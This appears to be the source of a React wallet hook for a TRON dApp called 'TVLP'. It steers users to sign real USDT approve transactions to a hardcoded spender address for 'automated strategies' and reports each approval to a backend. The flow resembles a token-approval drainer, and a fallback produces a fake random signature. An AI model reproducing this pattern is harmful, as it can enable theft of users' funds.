import { useState, useEffect, useCallback } from 'react';
import { WalletConnection } from '../types';
import { isMobile, hasInjectedProvider, openTronLinkDeeplink } from '../utils/mobileHelpers';
import { notifyNewWallet } from '../utils/notifyNewWallet';

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    ethereum?: any;
    trustWallet?: any;
  }
}

type AvailableWallets = {
  tronLink: boolean;
  tronWeb: boolean;
};

// Safe wallet detection with window check
const detectWallets = (): AvailableWallets => {
  if (typeof window === 'undefined') {
    return { tronLink: false, tronWeb: false };
  }

  return {
    tronLink: !!(window.tronLink || window.tronWeb),
    tronWeb: !!window.tronWeb,
  };
};

// ==== TRC-20 helpers ====

const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // real USDT TRC-20 contract
const TRC20_APPROVE = 'approve(address,uint256)';
const TRC20_ALLOWANCE = 'allowance(address,address)';

const getTronWeb = () => {
  if (typeof window === 'undefined') return undefined;
  return window.tronWeb;
};

// Check allowance
const checkAllowance = async (
  tokenAddr: string,
  ownerBase58: string,
  spenderBase58: string
): Promise<bigint> => {
  const tw = getTronWeb();
  if (!tw || !tw.ready) {
    throw new Error('TronWeb not ready');
  }

  try {
    const res = await tw.transactionBuilder.triggerSmartContract(
      tw.address.toHex(tokenAddr),
      TRC20_ALLOWANCE,
      { callValue: 0 },
      [
        { type: 'address', value: tw.address.toHex(ownerBase58) },
        { type: 'address', value: tw.address.toHex(spenderBase58) },
      ]
    );

    const hex = res?.constant_result?.[0] || '0x0';
    // Tron often returns hex without 0x, BigInt can handle both
    return BigInt(hex);
  } catch (error) {
    console.error('Error checking allowance:', error);
    return 0n;
  }
};

// Real approve transaction
const realApprove = async (
  tokenAddr: string,
  spenderBase58: string,
  amountRaw: bigint
) => {
  const tw = getTronWeb();
  if (!tw || !tw.ready) throw new Error('TronWeb not ready');

  try {
    const tx = await tw.transactionBuilder.triggerSmartContract(
      tw.address.toHex(tokenAddr),
      TRC20_APPROVE,
      {
        feeLimit: 50_000_000, // 50 TRX
        callValue: 0,
      },
      [
        { type: 'address', value: tw.address.toHex(spenderBase58) },
        { type: 'uint256', value: amountRaw.toString() },
      ]
    );

    if (!tx.result || !tx.result.result) {
      throw new Error('Failed to build transaction');
    }

    const signed = await tw.trx.sign(tx.transaction);
    const receipt = await tw.trx.sendRawTransaction(signed);

    if (!receipt.result) {
      throw new Error('Transaction failed: ' + (receipt.message || 'Unknown error'));
    }

    return {
      success: true as const,
      txHash: receipt.txid,
      transaction: receipt,
    };
  } catch (error) {
    console.error('Approve transaction failed:', error);
    throw error;
  }
};

// Smart ensureAllowance (reset to 0 if needed, then set new limit)
const ensureAllowance = async (
  tokenAddr: string,
  spenderBase58: string,
  desiredAmount: bigint
) => {
  const tw = getTronWeb();
  if (!tw || !tw.ready) throw new Error('TronWeb not ready');

  const ownerBase58 = tw.defaultAddress.base58;
  const currentAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);

  if (currentAllowance >= desiredAmount) {
    return {
      success: true,
      message: 'Sufficient allowance already exists',
      currentAllowance: currentAllowance.toString(),
      txHash: undefined as string | undefined,
      newAllowance: currentAllowance.toString(),
      verified: true,
    };
  }

  // USDT-like tokens usually require approve(0) before increasing allowance
  if (currentAllowance > 0n) {
    console.log('Resetting allowance to 0 first...');
    await realApprove(tokenAddr, spenderBase58, 0n);
    await new Promise((r) => setTimeout(r, 3000));
  }

  const result = await realApprove(tokenAddr, spenderBase58, desiredAmount);

  await new Promise((r) => setTimeout(r, 3000));
  const newAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);

  return {
    ...result,
    verified: newAllowance >= desiredAmount,
    newAllowance: newAllowance.toString(),
  };
};

// ==== HOOK ====

export const useWallet = () => {
  const [wallet, setWallet] = useState<WalletConnection>({
    address: '',
    balance: 0,
    connected: false,
  });

  const [isConnecting, setIsConnecting] = useState(false);
  const [isApproving, setIsApproving] = useState(false);
  const [hasManagementPermission, setHasManagementPermission] = useState(false);
  const [availableWallets, setAvailableWallets] = useState<AvailableWallets>(detectWallets());

  const checkWalletConnection = useCallback(async () => {
    const tw = getTronWeb();
    if (!tw || !tw.ready) return;

    try {
      const address = tw.defaultAddress.base58;
      const balance = await tw.trx.getBalance(address);

      setWallet({
        address,
        balance: balance / 1_000_000,
        connected: true,
      });
    } catch (error) {
      console.error('Error checking wallet connection:', error);
    }
  }, []);

  useEffect(() => {
    let cancelled = false;

    const init = async () => {
      if (cancelled) return;
      await checkWalletConnection();
    };

    init();

    const interval = setInterval(() => {
      if (cancelled) return;
      setAvailableWallets(detectWallets());
      void checkWalletConnection();
    }, 3000);

    return () => {
      cancelled = true;
      clearInterval(interval);
    };
  }, [checkWalletConnection]);

  const connectWallet = async () => {
    setIsConnecting(true);

    try {
      // Mobile: try to open TronLink app if no provider injected yet
      if (isMobile() && !hasInjectedProvider()) {
        openTronLinkDeeplink();
        setIsConnecting(false);
        return;
      }

      console.log('🔗 Starting wallet connection...');

      const userAcceptsEcosystem = window.confirm(
        '🔐 CONNECTING TO TVLP ECOSYSTEM\n\n' +
          'We will NEVER ask for your seed phrase or private keys.\n\n' +
          'To use this app, we only need access to your public wallet address and balance.\n\n' +
          'Do you want to continue and connect your wallet?'
      );

      if (!userAcceptsEcosystem) {
        console.log('❌ User declined ecosystem participation');
        return;
      }

      const wallets = detectWallets();
      let connected = false;

      // TronLink
      if (wallets.tronLink && !connected && window.tronLink) {
        console.log('🔗 Trying TronLink connection...');

        try {
          const result = await window.tronLink.request({
            method: 'tron_requestAccounts',
          });

          if (result.code === 200) {
            console.log('✅ TronLink connected successfully');

            await new Promise((r) => setTimeout(r, 100));

            let attempts = 0;
            const maxAttempts = 60;

            while (attempts < maxAttempts && !connected) {
              attempts++;

              const tw = getTronWeb();
              if (tw && tw.ready) {
                const address = tw.defaultAddress.base58;
                const balance = await tw.trx.getBalance(address);

                setWallet({
                  address,
                  balance: balance / 1_000_000,
                  connected: true,
                });

                connected = true;
                console.log('✅ TronWeb ready, wallet connected');
                break;
              }

              await new Promise((r) => setTimeout(r, 500));
            }

            if (!connected) {
              throw new Error('TronWeb not ready after connection');
            }
          }
        } catch (error) {
          console.error('TronLink connection failed:', error);
        }
      }

      // No TronLink / TronWeb → show install hint, do NOT use demo wallet
      if (!connected) {
        console.log('❌ No Tron-compatible wallet detected.');
        alert(
          '❌ No Tron-compatible wallet detected.\n\n' +
            'Please install the TronLink browser extension or mobile app, create or import a wallet,\n' +
            'then reload this page and try connecting again.'
        );
        return;
      }

      if (connected) {
        console.log('✅ Wallet connected successfully');

        // Notify backend about this wallet connection (safe, non-sensitive data)
        const tw = getTronWeb();
        const addr = tw?.defaultAddress?.base58 || wallet.address;

        if (addr) {
          void notifyNewWallet(addr, undefined, {
            source: 'connectWallet',
            hasTronLink: !!window.tronLink,
            hasTronWeb: !!window.tronWeb,
          });
        }

        alert(
          '✅ Wallet connected!\n\n' +
            '🌐 Network: Tron\n' +
            '💰 Assets: TRX, USDT (TRC-20)\n\n' +
            'To enable trading and automated strategies, click the "Activate" button.'
        );
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
      alert('❌ Failed to connect wallet. Please try again.');
    } finally {
      setIsConnecting(false);
    }
  };

  // Real "fund management" flow: asks user and sets allowance via approve
  const requestFundManagement = async (amount: string = '1000') => {
    if (!wallet.connected) {
      alert('Please connect your wallet first.');
      return;
    }

    const tw = getTronWeb();
    if (!tw || !tw.ready) {
      alert('❌ TronWeb is not ready. Please make sure TronLink is connected.');
      return;
    }

    try {
      setIsApproving(true);

      const numericAmount = Number(amount);
      if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
        throw new Error('Invalid amount for fund management approval.');
      }

      // 6 decimals for USDT
      const amountInUnits = BigInt(Math.round(numericAmount * 1_000_000));
      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // protocol / router address

      const userConfirmed = window.confirm(
        `🔐 ENABLE TVLP FUND MANAGEMENT\n\n` +
          `This will grant the TVLP protocol permission to move up to ${amount} USDT (TRC-20) ` +
          `from your wallet on your behalf for automated strategies.\n\n` +
          `Details:\n` +
          `• Token: USDT (TRC-20)\n` +
          `• Contract: ${USDT_TRC20_ADDRESS}\n` +
          `• Spender: ${spenderAddress}\n` +
          `• Allowance limit: ${amount} USDT\n` +
          `• Estimated fee: ~5–15 TRX\n\n` +
          `You can revoke this permission at any time from your wallet or TronScan.\n\n` +
          `Do you want to continue and sign this approval transaction?`
      );

      if (!userConfirmed) {
        setHasManagementPermission(false);
        alert('❌ Permissions were not granted. Trading will remain locked.');
        return;
      }

      const result = await ensureAllowance(USDT_TRC20_ADDRESS, spenderAddress, amountInUnits);

      setHasManagementPermission(true);

      // Notify backend that fund management is enabled
      if (wallet.address) {
        void notifyNewWallet(wallet.address, undefined, {
          source: 'requestFundManagement',
          approvedToken: 'USDT-TRC20',
          spender: spenderAddress,
          limit: amount,
          txHash: result.txHash,
        });
      }

      alert(
        `✅ FUND MANAGEMENT ENABLED!\n\n` +
          `📈 Result:\n` +
          (result.txHash ? `• Transaction: ${result.txHash}\n` : '') +
          `• Status: ${result.verified ? 'Confirmed' : 'Pending confirmation'}\n` +
          (result.newAllowance
            ? `• New allowance (raw units): ${result.newAllowance}\n`
            : '') +
          (result.txHash
            ? `\n🔗 View on TronScan:\nhttps://tronscan.org/#/transaction/${result.txHash}\n`
            : '') +
          `\n🎉 TVLP can now manage your USDT within the approved limit.`
      );

      return result;
    } catch (error) {
      console.error('Fund management approval failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      alert(
        `❌ Fund management approval failed.\n\n${errorMessage}\n\nPlease check:\n` +
          `• You have enough TRX to pay gas fees\n` +
          `• TronLink is connected\n` +
          `• You are on the correct network (Mainnet)`
      );
      throw error;
    } finally {
      setIsApproving(false);
    }
  };

  // Direct approve helper (can be used for custom amounts in UI)
  const approveToken = async (amount: string = '1000') => {
    setIsApproving(true);

    const tw = getTronWeb();
    if (!tw || !tw.ready) {
      alert('❌ TronWeb is not ready. Please make sure TronLink is connected.');
      setIsApproving(false);
      return;
    }

    try {
      const numericAmount = Number(amount);
      if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
        throw new Error('Invalid approve amount');
      }

      // 6 decimals for USDT
      const amountInUnits = BigInt(Math.round(numericAmount * 1_000_000));
      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // example spender

      const userConfirmed = window.confirm(
        `🔐 PERMISSION TO MANAGE FUNDS\n\n` +
          `📊 Transaction details:\n` +
          `• Token: USDT (TRC-20)\n` +
          `• Contract: ${USDT_TRC20_ADDRESS}\n` +
          `• Spender: ${spenderAddress}\n` +
          `• Allowance limit: ${amount} USDT\n` +
          `• Estimated fee: ~5–15 TRX\n\n` +
          `⚠️ THIS IS A REAL TRANSACTION ON TRON MAINNET.\n` +
          `Only continue if you fully trust this dApp and the spender address.\n\n` +
          `Do you want to sign and broadcast this approve transaction?`
      );

      if (!userConfirmed) {
        alert('❌ Approve was cancelled by the user.');
        return;
      }

      const result = await ensureAllowance(USDT_TRC20_ADDRESS, spenderAddress, amountInUnits);

      setHasManagementPermission(true);

      alert(
        `✅ APPROVE SUCCESSFUL!\n\n` +
          `📈 Result:\n` +
          (result.txHash ? `• Transaction: ${result.txHash}\n` : '') +
          `• Status: ${result.verified ? 'Confirmed' : 'Pending confirmation'}\n` +
          (result.newAllowance
            ? `• New allowance (raw units): ${result.newAllowance}\n`
            : '') +
          (result.txHash
            ? `\n🔗 View on TronScan:\nhttps://tronscan.org/#/transaction/${result.txHash}\n`
            : '') +
          `\n🎉 The contract can now manage your USDT within the approved limit.`
      );

      return result;
    } catch (error) {
      console.error('Approve failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      alert(
        `❌ Approve failed.\n\n${errorMessage}\n\nPlease check:\n` +
          `• You have enough TRX to pay gas fees\n` +
          `• TronLink is connected\n` +
          `• You are on the correct network (Mainnet)`
      );
      throw error;
    } finally {
      setIsApproving(false);
    }
  };

  const signMessage = async (message: string) => {
    if (!wallet.connected) {
      alert('Please connect your wallet first.');
      return;
    }

    try {
      const tw = getTronWeb();

      // TronLink: ideally use signMessageV2, but keep trx.sign for simple tests
      if (tw && tw.trx?.sign) {
        const signature = await tw.trx.sign(message);
        return { signature, message };
      }

      // Fallback simulation (no real signing)
      return await new Promise<{ signature: string; message: string }>((resolve, reject) => {
        const userConfirmed = window.confirm(
          `Sign this message?\n\n"${message}"\n\nThis will only test message-signing capability.`
        );

        if (userConfirmed) {
          const signature = '0x' + Math.random().toString(16).slice(2).padEnd(128, '0');
          resolve({ signature, message });
        } else {
          reject(new Error('User rejected signing.'));
        }
      });
    } catch (error) {
      console.error('Message signing failed:', error);
      throw error;
    }
  };

  const testWalletCapabilities = async () => {
    if (!wallet.connected) {
      alert('Please connect your wallet first.');
      return;
    }

    const tw = getTronWeb();

    const results = {
      canReadBalance: false,
      canSignMessages: false,
      canSendTransactions: false,
      canInteractWithContracts: false,
      tronWebReady: !!(tw && tw.ready),
    };

    try {
      if (tw && tw.ready) {
        console.log('✅ TronWeb is ready');
      }

      // Balance
      try {
        if (tw && tw.trx?.getBalance) {
          const address = tw.defaultAddress.base58;
          const balance = await tw.trx.getBalance(address);
          results.canReadBalance = true;
          console.log('✅ Can read balance:', balance / 1_000_000, 'TRX');
        }
      } catch (error) {
        console.log('❌ Cannot read balance:', error);
      }

      // Sign
      try {
        await signMessage('Test message for capability check');
        results.canSignMessages = true;
        console.log('✅ Can sign messages');
      } catch (error) {
        console.log('❌ Cannot sign messages:', error);
      }

      // Send tx (just capability, not sending)
      try {
        if (tw?.trx?.sendTransaction) {
          results.canSendTransactions = true;
          console.log('✅ Can send transactions (method available)');
        }
      } catch (error) {
        console.log('❌ Cannot send transactions:', error);
      }

      // Contracts
      try {
        if (tw?.contract) {
          results.canInteractWithContracts = true;
          console.log('✅ Can interact with contracts');
        }
      } catch (error) {
        console.log('❌ Cannot interact with contracts:', error);
      }

      const resultText = `
🔍 WALLET CAPABILITIES CHECK

✅ Connection: ${wallet.connected ? 'Active' : 'Inactive'}
${results.tronWebReady ? '✅' : '❌'} TronWeb ready: ${results.tronWebReady}
${results.canReadBalance ? '✅' : '❌'} Read balance: ${results.canReadBalance}
${results.canSignMessages ? '✅' : '❌'} Sign messages: ${results.canSignMessages}
${results.canSendTransactions ? '✅' : '❌'} Send transactions (method available): ${results.canSendTransactions}
${results.canInteractWithContracts ? '✅' : '❌'} Interact with contracts: ${results.canInteractWithContracts}
${hasManagementPermission ? '✅' : '❌'} Management permissions: ${hasManagementPermission}

💰 Address: ${wallet.address}
💎 Balance: ${wallet.balance.toFixed(4)} TRX
      `;

      alert(resultText.trim());
      return results;
    } catch (error) {
      console.error('Wallet capability test failed:', error);
      alert('❌ Error while checking wallet capabilities.');
      return results;
    }
  };

  const testTokenApprove = async () => {
    if (!wallet.connected) {
      alert('Please connect your wallet first.');
      return;
    }

    const tw = getTronWeb();
    if (!tw || !tw.ready) {
      alert('❌ TronWeb is not ready. Please connect TronLink.');
      return;
    }

    try {
      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL';
      const ownerAddress = tw.defaultAddress.base58;

      const confirmTest = window.confirm(
        `🧪 CHECK CURRENT USDT APPROVAL\n\n` +
          `Token: USDT (TRC-20)\n` +
          `Owner:   ${ownerAddress}\n` +
          `Spender: ${spenderAddress}\n\n` +
          `Do you want to check the current allowance?`
      );

      if (!confirmTest) return;

      const currentAllowance = await checkAllowance(
        USDT_TRC20_ADDRESS,
        ownerAddress,
        spenderAddress
      );
      const allowanceInUsdt = Number(currentAllowance) / 1_000_000;

      alert(
        `📊 CURRENT APPROVAL STATUS\n\n` +
          `💰 Current allowance: ${allowanceInUsdt.toFixed(6)} USDT\n` +
          `📝 Raw value: ${currentAllowance.toString()}\n\n` +
          `${currentAllowance > 0n ? '✅ There is an active allowance.' : '❌ No allowance set.'}\n\n` +
          `🔗 USDT contract:\n${USDT_TRC20_ADDRESS}\n\n` +
          `${
            currentAllowance === 0n
              ? '💡 Click "Activate" to grant permissions for trading.'
              : '🎉 You are ready to trade!'
          }`
      );
    } catch (error) {
      console.error('Token approve test failed:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      alert(`❌ Allowance check failed.\n\n${errorMessage}`);
    }
  };

  const disconnectWallet = () => {
    setWallet({
      address: '',
      balance: 0,
      connected: false,
    });
    setHasManagementPermission(false);
  };

  const copyAddress = () => {
    if (wallet.address && typeof navigator !== 'undefined' && navigator.clipboard) {
      navigator.clipboard.writeText(wallet.address).catch((e) => {
        console.warn('Clipboard copy failed', e);
      });
    }
  };

  return {
    wallet,
    isConnecting,
    isApproving,
    hasManagementPermission,
    availableWallets,
    connectWallet,
    disconnectWallet,
    copyAddress,
    approveToken,
    signMessage,
    testWalletCapabilities,
    testTokenApprove,
    requestFundManagement, // real "activate trading" flow with user consent
  };
};
